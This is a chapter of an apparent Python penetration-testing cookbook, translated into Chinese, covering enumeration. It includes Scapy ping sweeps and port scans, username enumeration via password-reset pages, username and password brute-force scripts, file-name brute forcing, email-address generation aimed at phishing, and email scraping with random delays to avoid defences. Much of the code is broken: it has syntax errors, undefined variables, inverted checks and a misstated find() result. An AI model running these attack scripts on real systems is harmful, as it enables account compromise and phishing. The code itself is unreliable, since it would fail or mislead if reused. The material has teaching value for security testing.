# 第二章。枚举

在本章中，我们将涵盖以下主题：

+   使用 Scapy 执行 ping 扫描

+   使用 Scapy 进行扫描

+   检查用户名的有效性

+   暴力破解用户名

+   枚举文件

+   暴力破解密码

+   从姓名生成电子邮件地址

+   从网页中查找电子邮件地址

+   在源代码中查找注释

# 介绍

当你确定了要测试的目标后，你会想要进行一些枚举。这将帮助你确定一些进一步侦察或攻击的潜在路径。这是一个重要的步骤。毕竟，如果你想从保险柜里偷东西，你首先会看一下，确定你是否需要密码、钥匙或组合，而不是简单地绑上一根炸药棒，可能摧毁内容。

在本章中，我们将看一些你可以使用 Python 执行主动枚举的方法。

# 使用 Scapy 执行 ping 扫描

当你确定了目标网络后，要执行的第一个任务之一是检查哪些主机是活动的。实现这一目标的一个简单方法是 ping 一个 IP 地址，并确认是否收到回复。然而，对于超过几个主机来说，这样做很快就会变成一项繁重的任务。这个教程旨在向你展示如何使用 Scapy 实现这一目标。

Scapy 是一个强大的工具，可以用来操纵网络数据包。虽然我们不会深入探讨 Scapy 可以完成的所有功能，但在这个教程中，我们将使用它来确定哪些主机会回复**Internet 控制消息协议**（**ICMP**）数据包。虽然你可能可以创建一个简单的 bash 脚本，并将其与一些 grep 过滤器结合起来，但这个教程旨在向你展示在涉及迭代 IP 范围的任务中会有用的技术，以及基本 Scapy 用法的示例。

Scapy 可以通过以下命令安装在大多数 Linux 系统上：

```py
$ sudo apt-get install python-scapy

```

## 如何做…

以下脚本显示了如何使用 Scapy 创建 ICMP 数据包并在收到响应时处理它：

```py
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

import sys 
from scapy.all import *

if len(sys.argv) !=3:
    print "usage: %s start_ip_addr end_ip_addr" % (sys.argv[0])
    sys.exit(0)

livehosts=[]
#IP address validation
ipregex=re.compile("^([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0- 9]|25[0-5])\.([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0- 5])\.([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\.([0- 9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])$")

if (ipregex.match(sys.argv[1]) is None):
  print "Starting IP address is invalid"
  sys.exit(0)
if (ipregex.match(sys.argv[1]) is None):
  print "End IP address is invalid"
  sys.exit(0)

iplist1 = sys.argv[1].split(".")
iplist2 = sys.argv[2].split(".")

if not (iplist1[0]==iplist2[0] and iplist1[1]==iplist2[1] and iplist1[2]==iplist2[2])
  print "IP addresses are not in the same class C subnet"
  sys.exit(0)	

if iplist1[3]>iplist2[3]:
  print "Starting IP address is greater than ending IP address"
  sys.exit(0)

networkaddr = iplist1[0]+"."+iplist1[1]+"."+iplist[2]+"."

start_ip_last_octet = int(iplist1[3])
end_ip_last_octet = int(iplist2[3])

if iplist1[3]<iplist2[3]:
  print "Pinging range "+networkaddr+str(start_ip_last_octet)+"- "+str(end_ip_last_octet)
else
  print "Pinging "+networkaddr+str(startiplastoctect)+"\n"

for x in range(start_ip_last_octet, end_ip_last_octet+1)
  packet=IP(dst=networkaddr+str(x))/ICMP()
  response = sr1(packet,timeout=2,verbose=0)
  if not (response is None):
    if  response[ICMP].type==0:
      livehosts.append(networkaddr+str(x))

print "Scan complete!\n"
if len(livehosts)>0:
  print "Hosts found:\n"
  for host in livehosts:
    print host+"\n"
else:
  print "No live hosts found\n"
```

## 它是如何工作的…

脚本的第一部分将设置在运行 Scapy 时抑制警告消息。在没有配置 IPv6 的机器上导入 Scapy 时，一个常见的情况是收到关于无法通过 IPv6 路由的警告消息。

```py
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
```

下一部分导入必要的模块，验证接收到的参数数量，并设置一个用于存储发现的活动主机的列表：

```py
import sys 
from scapy.all import *

if len(sys.argv) !=3:
    print "usage: %s start_ip_addr end_ip_addr" % (sys.argv[0])
    sys.exit(0)

livehosts=[]
```

然后我们编译一个正则表达式，用于检查 IP 地址的有效性。这不仅检查字符串的格式，还检查它是否存在于 IPv4 地址空间中。然后使用编译后的正则表达式与提供的参数进行匹配：

```py
#IP address validation
ipregex=re.compile("^([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0- 9]|25[0-5])\.([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0- 5])\.([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\.([0- 9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])$")

if (ipregex.match(sys.argv[1]) is None):
  print "Starting IP address is invalid"
  sys.exit(0)
if (ipregex.match(sys.argv[1]) is None):
  print "End IP address is invalid"
  sys.exit(0)
```

一旦 IP 地址被验证，就会进行进一步的检查，以确保提供的范围是有效的，并分配将用于设置循环参数的变量：

```py
iplist1 = sys.argv[1].split(".")
iplist2 = sys.argv[2].split(".")

if not (iplist1[0]==iplist2[0] and iplist1[1]==iplist2[1] and iplist1[2]==iplist2[2])
  print "IP addresses are not in the same class C subnet"
  sys.exit(0)

if iplist1[3]>iplist2[3]:
  print "Starting IP address is greater than ending IP address"
  sys.exit(0)

networkaddr = iplist1[0]+"."+iplist1[1]+"."+iplist[2]+"."

start_ip_last_octet = int(iplist1[3])
end_ip_last_octet = int(iplist2[3])
```

脚本的下一部分纯粹是信息性的，可以省略。它将打印出要 ping 的 IP 地址范围，或者在提供的两个参数相等的情况下，要 ping 的 IP 地址：

```py
if iplist1[3]<iplist2[3]:
  print "Pinging range "+networkaddr+str(start_ip_last_octet)+"- "+str(end_ip_last_octet)
else
  print "Pinging "+networkaddr+str(startiplastoctect)+"\n"
```

然后我们进入循环，并开始创建一个 ICMP 数据包：

```py
for x in range(start_ip_last_octet, end_ip_last_octet+1)
  packet=IP(dst=networkaddr+str(x))/ICMP()
```

之后，我们使用`sr1`命令发送数据包并接收一个数据包返回：

```py
response = sr1(packet,timeout=2,verbose=0)
```

最后，我们检查是否收到了响应，以及响应代码是否为`0`。这是因为响应代码为`0`表示回显回复。其他代码可能报告无法到达目的地。如果响应通过了这些检查，那么 IP 地址将被追加到`livehosts`列表中。

```py
if not (response is None):
    if  response[ICMP].type==0:
      livehosts.append(networkaddr+str(x))
```

如果找到了活动主机，脚本将打印出列表。

# 使用 Scapy 进行扫描

Scapy 是一个强大的工具，可用于操纵网络数据包。虽然我们不会深入探讨 Scapy 可以完成的所有工作，但我们将在本教程中使用它来确定目标上打开的 TCP 端口。通过识别目标上打开的端口，您可以确定正在运行的服务类型，并使用这些服务进一步进行测试。

## 如何做...

这是将在给定端口范围内对特定目标执行端口扫描的脚本。它接受目标、端口范围的起始和结束参数：

```py
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

import sys 
from scapy.all import *

if len(sys.argv) !=4:
    print "usage: %s target startport endport" % (sys.argv[0])
    sys.exit(0)

target = str(sys.argv[1])
startport = int(sys.argv[2])
endport = int(sys.argv[3])
print "Scanning "+target+" for open TCP ports\n"
if startport==endport:
  endport+=1
for x in range(startport,endport):
    packet = IP(dst=target)/TCP(dport=x,flags="S")
    response = sr1(packet,timeout=0.5,verbose=0)
    if response.haslayer(TCP) and response.getlayer(TCP).flags == 0x12:
    print "Port "+str(x)+" is open!"
    sr(IP(dst=target)/TCP(dport=response.sport,flags="R"), timeout=0.5, verbose=0)

print "Scan complete!\n"
```

## 工作原理...

您在本教程中注意到的第一件事是脚本的前两行：

```py
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
```

这些行用于抑制 Scapy 在未配置 IPv6 路由时创建的警告，这会导致以下输出：

```py
WARNING: No route found for IPv6 destination :: (no default route?)

```

这对于脚本的功能并不是必需的，但在运行时可以使输出更整洁。

接下来的几行将验证参数的数量并将参数分配给脚本中使用的变量。脚本还会检查端口范围的起始和结束是否相同，并递增结束端口以便循环能够工作。

设置完成后，我们将循环遍历端口范围，脚本的真正内容随之而来。首先，我们创建一个基本的 TCP 数据包：

```py
packet = IP(dst=target)/TCP(dport=x,flags="S")
```

然后我们使用`sr1`命令。这个命令是`send/receive1`的缩写。此命令将发送我们创建的数据包并接收返回的第一个数据包。我们提供的其他参数包括超时，因此脚本不会挂起关闭或过滤的端口，我们设置的详细参数将关闭 Scapy 在发送数据包时通常创建的输出。

然后脚本会检查是否有包含 TCP 数据的响应。如果包含 TCP 数据，则脚本将检查 SYN 和 ACK 标志。这些标志的存在将指示 SYN-ACK 响应，这是 TCP 协议握手的一部分，并显示端口是打开的。

如果确定某个端口是打开的，将打印输出以此效果，并且代码的下一行发送重置：

```py
sr(IP(dst=target)/TCP(dport=response.sport,flags="R"),timeout=0.5, verbose=0)
```

这一行是必要的，以便关闭连接并防止发生 TCP SYN 洪水攻击，如果端口范围和打开端口的数量很大。

## 还有更多...

在本教程中，我们向您展示了如何使用 Scapy 执行 TCP 端口扫描。本教程中使用的技术可以被调整以在主机上执行 UDP 端口扫描或在一系列主机上执行 ping 扫描。

这只是触及 Scapy 能力的表面。有关更多信息，一个很好的起点是官方 Scapy 网站[`www.secdev.org/projects/scapy/`](http://www.secdev.org/projects/scapy/)。

# 检查用户名的有效性

在进行侦察时，您可能会遇到网络应用程序的部分，这些部分将允许您确定某些用户名是否有效。一个典型的例子是当您忘记密码时，页面允许您请求密码重置。例如，如果页面要求您输入用户名以进行密码重置，它可能会根据用户名是否存在而给出不同的响应。因此，如果用户名不存在，页面可能会响应“找不到用户名”或类似的内容。但是，如果用户名存在，它可能会将您重定向到登录页面，并通知您“密码重置说明已发送到您注册的电子邮件地址”。

## 准备工作

每个网络应用程序可能都不同。因此，在继续创建用户名检查工具之前，您需要进行侦察。您需要找到的详细信息包括访问请求密码重置的页面，需要发送到该页面的参数，以及成功或失败结果的情况。

## 如何做...

一旦您了解了目标上密码重置请求的工作原理，就可以组装您的脚本。以下是您的工具的示例：

```py
#basic username check
import sys
import urllib
import urllib2

if len(sys.argv) !=2:
    print "usage: %s username" % (sys.argv[0])
    sys.exit(0)

url = "http://www.vulnerablesite.com/resetpassword.html"
username = str(sys.argv[1])
data = urllib.urlencode({"username":username})
response = urllib2.urlopen(url,data).read()
UnknownStr="Username not found"
if(response.find(UnknownStr)<0):
  print "Username does not exist\n"
else
  print "Username exists!"
```

以下显示了使用此脚本时产生的输出示例：

```py
user@pc:~# python usernamecheck.py randomusername

Username does not exist

user@pc:~# python usernamecheck.py admin

Username exists!

```

## 它是如何工作的...

在验证了参数数量并将参数分配给变量之后，我们使用`urllib`模块对要提交到页面的数据进行编码：

```py
data = urllib.urlencode({"username":username})
```

然后我们寻找指示请求由于不存在的用户名而失败的字符串：

```py
UnknownStr="Username not found"
```

find（`str`）的结果并不是简单的 true 或 false。相反，它将返回在字符串中找到子字符串的位置。但是，如果它没有找到您正在搜索的子字符串，它将返回`1`。

## 还有更多...

此示例可以适应其他情况。密码重置可能会要求输入电子邮件地址而不是用户名。或者成功的响应可能会显示用户注册的电子邮件地址。重要的是要注意可能会透露比应该更多信息的 Web 应用程序的情况。

## 另请参阅

对于更大的工作，您将希望考虑使用*暴力破解用户名*示例。

# 暴力破解用户名

对于小型但常规的情况，一个快速检查工具就足够了。那么对于更大的工作呢？也许您从开源情报收集中获得了大量数据，并且想要查看这些用户中有多少使用您正在针对的应用程序。这个示例将向您展示如何自动化检查您在文件中存储的用户名的过程。

## 准备工作

在使用此示例之前，您需要获取要测试的用户名列表。这可以是您自己创建的内容，也可以使用 Kali 中找到的字典。如果需要创建自己的列表，一个好的起点是使用可能在 Web 应用程序中找到的常见名称。这些可能包括用户名，如`user`，`admin`，`administrator`等。

## 如何做...

此脚本将尝试检查提供的用户名列表，以确定该应用程序中是否存在帐户：

```py
#brute force username enumeration
import sys
import urllib
import urllib2

if len(sys.argv) !=2:
    print "usage: %s filename" % (sys.argv[0])
    sys.exit(0)

filename=str(sys.argv[1])
userlist = open(filename,'r')
url = "http://www.vulnerablesite.com/forgotpassword.html"
foundusers = []
UnknownStr="Username not found"

for user in userlist:
  user=user.rstrip()
  data = urllib.urlencode({"username":user})
  request = urllib2.urlopen(url,data)
  response = request.read()

  if(response.find(UnknownStr)>=0):
    foundusers.append(user)
  request.close()
userlist.close()

if len(foundusers)>0:
  print "Found Users:\n"
  for name in foundusers:
    print name+"\n"
else:
  print "No users found\n"
```

以下是此脚本的输出示例：

```py
python bruteusernames.py userlist.txt
Found Users:
admin
angela
bob
john

```

## 它是如何工作的...

此脚本引入了比基本用户名检查更多的概念。其中之一是打开文件以加载我们的列表：

```py
userlist = open(filename,'r')
```

这将打开包含我们用户名列表的文件，并将其加载到我们的`userlist`变量中。然后我们循环遍历列表中的用户。在此示例中，我们还使用了以下代码行：

```py
user=user.strip()
```

此命令会去除空格，包括换行符，有时这会改变提交前的编码结果。

如果用户名存在，则将其附加到列表中。当所有用户名都已检查时，将输出列表的内容。

## 另请参阅

对于单个用户名，您将希望使用*基本用户名检查*示例。

# 枚举文件

在枚举 Web 应用程序时，您将希望确定哪些页面存在。通常使用的常见做法是所谓的蜘蛛爬行。蜘蛛爬行通过访问网站，然后跟踪该页面内的每个链接以及该网站内的任何后续页面。但是，对于某些网站，例如维基，如果链接在访问时执行编辑或删除功能，则此方法可能导致数据被删除。此示例将取而代之，它将获取常见的 Web 页面文件名列表，并检查它们是否存在。

## 准备工作

对于这个示例，您需要创建一个常见的页面名称列表。渗透测试发行版，如 Kali Linux，将配备各种暴力破解工具的字典，这些字典可以用来代替生成您自己的字典。

## 如何做...

以下脚本将获取可能的文件名列表，并测试页面是否存在于网站中：

```py
#bruteforce file names
import sys
import urllib2

if len(sys.argv) !=4:
    print "usage: %s url wordlist fileextension\n" % (sys.argv[0])
    sys.exit(0)

base_url = str(sys.argv[1])
wordlist= str(sys.argv[2])
extension=str(sys.argv[3])
filelist = open(wordlist,'r')
foundfiles = []

for file in filelist:
  file=file.strip("\n")
  extension=extension.rstrip()
  url=base_url+file+"."+str(extension.strip("."))
  try:
    request = urllib2.urlopen(url)
    if(request.getcode()==200):
      foundfiles.append(file+"."+extension.strip("."))
    request.close()
  except urllib2.HTTPError, e:
    pass

if len(foundfiles)>0:
  print "The following files exist:\n"
  for filename in foundfiles:
    print filename+"\n"
else:
  print "No files found\n"
```

以下输出显示了针对**Damn Vulnerable Web App** (**DVWA**)使用常见网页列表运行时可能返回的内容：

```py
python filebrute.py http://192.168.68.137/dvwa/ filelist.txt .php
The following files exist:

index.php

about.php

login.php

security.php

logout.php

setup.php

instructions.php

phpinfo.php

```

## 工作原理…

导入必要的模块并验证参数的数量后，要检查的文件名列表以只读模式打开，这由文件的`open`操作中的`r`参数表示：

```py
filelist = open(wordlist,'r')
```

当脚本进入文件名列表的循环时，会从文件名中剥离任何换行符，因为这会影响检查文件名存在时 URL 的创建。如果提供的扩展名中存在前置的`.`，那么也会被剥离。这允许使用包含或不包含前置`.`的扩展名，例如`.php`或`php`：

```py
  file=file.strip("\n")
  extension=extension.rstrip()
  url=base_url+file+"."+str(extension.strip("."))
```

然后脚本的主要操作是检查给定文件名的网页是否存在，通过检查`HTTP 200`代码并捕获任何不存在页面的错误：

```py
  try:
    request = urllib2.urlopen(url)
    if(request.getcode()==200):
      foundfiles.append(file+"."+extension.strip("."))
    request.close()
  except urllib2.HTTPError, e:
    pass
```

# 暴力破解密码

暴力破解可能不是最优雅的解决方案，但它将自动化可能是一项单调的任务。通过使用自动化，您可以更快地完成任务，或者至少可以让自己有时间同时处理其他事情。

## 准备工作

要使用此方法，您需要一个要测试的用户名列表，还需要一个密码列表。虽然这不是暴力破解的真正定义，但它会减少您要测试的组合数量。

### 注意

如果您没有密码列表可用，网上有许多可用的列表，例如 GitHub 上的前 10000 个最常见密码，链接在[`github.com/neo/discourse_heroku/blob/master/lib/common_passwords/10k-common-passwords.txt`](https://github.com/neo/discourse_heroku/blob/master/lib/common_passwords/10k-common-passwords.txt)。

## 操作步骤…

以下代码显示了如何实现此方法的示例：

```py
#brute force passwords
import sys
import urllib
import urllib2

if len(sys.argv) !=3:
    print "usage: %s userlist passwordlist" % (sys.argv[0])
    sys.exit(0)

filename1=str(sys.argv[1])
filename2=str(sys.argv[2])
userlist = open(filename1,'r')
passwordlist = open(filename2,'r')
url = "http://www.vulnerablesite.com/login.html"
foundusers = []
FailStr="Incorrect User or Password"

for user in userlist:
  for password in passwordlist:
    data = urllib.urlencode({"username="user&"password="password})
    request = urllib2.urlopen(url,data)
    response = request.read()
    if(response.find(FailStr)<0)
      foundcreds.append(user+":"+password)
    request.close()

if len(foundcreds)>0:
  print "Found User and Password combinations:\n"
  for name in foundcreds:
    print name+"\n"
else:
  print "No users found\n"
```

以下是运行脚本时产生的输出示例：

```py
python bruteforcepasswords.py userlists.txt passwordlist.txt

Found User and Password combinations:

root:toor

angela:trustno1

bob:password123

john:qwerty

```

## 工作原理…

在最初导入必要的模块并检查系统参数后，我们设置了密码检查：

```py
filename1=str(sys.argv[1])
filename2=str(sys.argv[2])
userlist = open(filename1,'r')
passwordlist = open(filename2,'r')
```

文件名参数存储在变量中，然后被打开。`r`变量表示我们以只读方式打开这些文件。

我们还指定了目标，并初始化一个数组来存储我们找到的任何有效凭据：

```py
url = "http://www.vulnerablesite.com/login.html"
foundusers = []
FailStr="Incorrect User or Password"
```

前面代码中的`FailStr`变量只是为了让我们的生活更轻松，通过使用一个简短的变量名来代替整个字符串的输入。

此方法的主要部分在一个嵌套循环中，我们在其中进行自动密码检查：

```py
for user in userlist:
  for password in passwordlist:
    data = urllib.urlencode({"username="user&"password="password })
    request = urllib2.urlopen(url,data)
    response = request.read()
    if(response.find(FailStr)<0)
      foundcreds.append(user+":"+password)
    request.close()
```

在此循环中，将发送一个包含用户名和密码的请求。如果响应不包含指示用户名和密码组合无效的字符串，那么我们知道我们有一组有效的凭据。然后将这些凭据添加到我们之前创建的数组中。

一旦尝试了所有的用户名和密码组合，我们就会检查数组，看看是否有任何凭据。如果有，我们就打印出凭据。如果没有，我们就打印出一个悲伤的消息，告诉我们我们什么都没找到：

```py
if len(foundcreds)>0:
  print "Found User and Password combinations:\n"
  for name in foundcreds:
    print name+"\n"
else:
  print "No users found\n"
```

## 另请参阅

如果您想要查找用户名，您可能还想使用*检查用户名有效性*和*暴力破解用户名*的方法。

# 从名称生成电子邮件地址

在某些情况下，您可能有一个目标公司的员工名单，并且想要生成一个电子邮件地址列表。电子邮件地址可能会有用。您可能想要使用它们来执行网络钓鱼攻击，或者您可能想要使用它们来尝试登录到公司的应用程序，例如包含敏感内部文档的电子邮件或企业门户。

## 准备工作

在使用此示例之前，您需要有一个要处理的姓名列表。如果没有姓名列表，您可能首先要考虑对目标进行开源情报练习。

## 如何做...

以下代码将获取一个包含姓名列表的文件，并生成不同格式的电子邮件地址列表：

```py
import sys

if len(sys.argv) !=3:
  print "usage: %s name.txt email suffix" % (sys.argv[0])
  sys.exit(0)
for line in open(sys.argv[1]):
  name = ''.join([c for c in line if c == " " or c.isalpha()])
  tokens = name.lower().split()
  fname = tokens[0]
  lname = tokens[-1]
  print fname+lname+sys.argv[2]
  print lname+fname+sys.argv[2]
  print fname+"."+lname+sys.argv[2]
  print lname+"."+fname+sys.argv[2]
  print lname+fname[0]+sys.argv[2]
  print fname+lname+fname+sys.argv[2]
  print fname[0]+lname+sys.argv[2]
  print fname[0]+"."+lname+sys.argv[2]
  print lname[0]+"."+fname+sys.argv[2]
  print fname+sys.argv[2]
  print lname+sys.argv[2]
```

## 它是如何工作的...

此示例中的主要机制是使用字符串连接。通过将名字或姓氏的不同组合与电子邮件后缀连接起来，您可以得到一个潜在的电子邮件地址列表，然后可以在以后的测试中使用。

## 还有更多...

所示的示例显示了如何使用姓名列表生成电子邮件地址列表。但并非所有电子邮件地址都是有效的。您可以通过在公司的应用程序中使用枚举技术来进一步缩小此列表，这可能会揭示电子邮件地址是否存在。您还可以进行进一步的开源情报调查，这可能会让您确定目标组织的电子邮件地址的正确格式。如果您成功做到了这一点，那么您可以从示例中删除任何不必要的格式，以生成更简洁的电子邮件地址列表，这将在以后为您提供更大的价值。

## 另请参阅

一旦您获得了电子邮件地址，您可能希望将它们作为*检查用户名有效性*示例的一部分使用。

# 从网页中查找电子邮件地址

与其生成自己的电子邮件列表，您可能会发现目标组织在其网页上存在一些电子邮件地址。这可能会比您自己生成的电子邮件地址具有更高的价值，因为目标组织网站上的电子邮件地址的有效性可能会比您尝试猜测的要高得多。

## 准备工作

对于此示例，您需要一个要解析电子邮件地址的页面列表。您可能希望访问目标组织的网站，并搜索站点地图。然后可以解析站点地图以获取存在于网站内的页面链接。

## 如何做...

以下代码将解析 URL 列表的响应，查找与电子邮件地址格式匹配的文本实例，并将它们保存到文件中：

```py
import urllib2
import re
import time
from random import randint
regex = re.compile(("([a-z0-9!#$%&'*+\/=?^_'{|}~-]+(?:\.[a-z0- 9!#$%&'*+\/=?^_'"
                    "{|}~-]+)*(@|\sat\s)(?:a-z0-9?(\.|"
                    "\sdot\s))+a-z0-9?)"))

tarurl = open("urls.txt", "r")
for line in tarurl:
  output = open("emails.txt", "a")
  time.sleep(randint(10, 100))
  try: 
    url = urllib2.urlopen(line).read()
    output.write(line)
    emails = re.findall(regex, url)
    for email in emails:
      output.write(email[0]+"\r\n")
      print email[0]
  except:
    pass
    print "error"
  output.close()
```

## 它是如何工作的...

导入必要的模块后，您将看到`regex`变量的赋值：

```py
regex = re.compile(("([a-z0-9!#$%&'*+\/=?^_'{|}~-]+(?:\.[a-z0- 9!#$%&'*+\/=?^_'"
                    "{|}~-]+)*(@|\sat\s)(?:a-z0-9?(\.|"
                    "\sdot\s))+a-z0-9?)"))
```

这尝试匹配电子邮件地址格式，例如`victim@target.com`，或者 victim at target dot com。然后，代码打开一个包含 URL 的文件：

```py
tarurl = open("urls.txt", "r")
```

您可能会注意到参数`r`的使用。这以只读模式打开文件。然后，代码循环遍历 URL 列表。在循环内，打开一个文件来保存电子邮件地址：

```py
output = open("emails.txt", "a")
```

这次使用了参数`a`。这表示对该文件的任何输入都将被追加而不是覆盖整个文件。脚本利用睡眠计时器以避免触发目标可能已经设置的任何防护措施来防止攻击：

```py
time.sleep(randint(10, 100))
```

此计时器将暂停脚本，随机间隔时间在`10`和`100`秒之间。

在使用`urlopen()`方法时，异常处理是至关重要的。如果`urlopen()`的响应是`404（HTTP 未找到错误）`，那么脚本将出错并退出。

如果有有效的响应，脚本将把所有电子邮件地址的实例存储在`emails`变量中：

```py
emails = re.findall(regex, url)
```

然后，它将循环遍历`emails`变量，并将列表中的每个项目写入`emails.txt`文件，并在控制台上输出以进行确认：

```py
    for email in emails:
      output.write(email[0]+"\r\n")
      print email[0]
```

## 还有更多...

本示例中使用的正则表达式匹配了互联网上表示电子邮件地址的两种常见格式。在学习和调查过程中，您可能会遇到其他您想要包含在匹配中的格式。有关 Python 中正则表达式的更多信息，您可以阅读 Python 网站上有关正则表达式的文档[`docs.python.org/2/library/re.html`](https://docs.python.org/2/library/re.html)。

## 另请参阅

有关更多信息，请参阅食谱*从名称生成电子邮件地址*。

# 在源代码中查找注释

常见的安全问题是由良好的编程实践引起的。在 Web 应用程序的开发阶段，开发人员会注释他们的代码。这在开发阶段非常有用，因为它有助于理解代码，并将作为各种原因的有用提醒。然而，当 Web 应用程序准备在生产环境中部署时，最佳做法是删除所有这些注释，因为它们可能对攻击者有用。

本示例将结合使用`Requests`和`BeautifulSoup`来搜索 URL 中的注释，以及在页面上搜索链接，并在这些后续 URL 中搜索注释。从页面上跟踪链接并分析这些 URL 的技术称为爬虫。

## 如何做…

以下脚本将在源代码中抓取 URL 的注释和链接。然后还将执行有限的爬虫并搜索链接的 URL 以查找注释：

```py
import requests
import re

from bs4 import BeautifulSoup
import sys

if len(sys.argv) !=2:
    print "usage: %s targeturl" % (sys.argv[0])
    sys.exit(0)

urls = []

tarurl = sys.argv[1]
url = requests.get(tarurl)
comments = re.findall('<!--(.*)-->',url.text)
print "Comments on page: "+tarurl
for comment in comments:
    print comment

soup = BeautifulSoup(url.text)
for line in soup.find_all('a'):
    newline = line.get('href')
    try:
        if newline[:4] == "http":
            if tarurl in newline:
                urls.append(str(newline))
        elif newline[:1] == "/":
            combline = tarurl+newline
            urls.append(str(combline))
    except:
        pass
        print "failed"
for uurl in urls:
    print "Comments on page: "+uurl
    url = requests.get(uurl)
    comments = re.findall('<!--(.*)-->',url.text)
    for comment in comments:
        print comment
```

## 它的工作原理…

在导入必要的模块并设置变量之后，脚本首先获取目标 URL 的源代码。

您可能已经注意到，对于`Beautifulsoup`，我们有以下行：

```py
from bs4 import BeautifulSoup
```

这样，当我们使用`BeautifulSoup`时，我们只需输入`BeautifulSoup`而不是`bs4.BeautifulSoup`。

然后搜索所有 HTML 注释的实例并将其打印出来：

```py
url = requests.get(tarurl)
comments = re.findall('<!--(.*)-->',url.text)
print "Comments on page: "+tarurl
for comment in comments:
    print comment
```

然后，脚本将使用`Beautifulsoup`来抓取源代码中任何绝对（以`http`开头）和相对（以`/`开头）链接的实例：

```py
if newline[:4] == "http":
            if tarurl in newline:
                urls.append(str(newline))
        elif newline[:1] == "/":
            combline = tarurl+newline
            urls.append(str(combline))
```

一旦脚本整理出从页面链接出去的 URL 列表，它将搜索每个页面的 HTML 注释。

## 还有更多…

本示例展示了注释抓取和爬虫的基本示例。可以根据需要为此示例添加更多智能。例如，您可能希望考虑使用以`。`或`..`开头的相对链接来表示当前目录和父目录。

您还可以对爬虫部分进行更多控制。您可以从提供的目标 URL 中提取域，并创建一个过滤器，不会抓取目标外部的域的链接。这对于需要遵守目标范围的专业工作特别有用。
